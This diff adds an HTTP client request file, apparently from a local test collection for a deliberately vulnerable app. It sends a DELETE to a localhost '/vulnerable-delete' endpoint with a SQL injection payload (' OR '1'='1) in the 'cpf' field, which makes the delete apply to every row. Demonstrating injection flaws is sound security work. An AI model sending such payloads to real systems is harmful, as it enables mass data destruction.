@@ -1,0 +1,17 @@
+meta {
+  name: /vulnerable-delete
+  type: http
+  seq: 8
+}
+
+delete {
+  url: http://localhost:3000/vulnerable-delete
+  body: json
+  auth: inherit
+}
+
+body:json {
+  {
+    "cpf": "12345678900' OR '1'='1"
+  }
+}
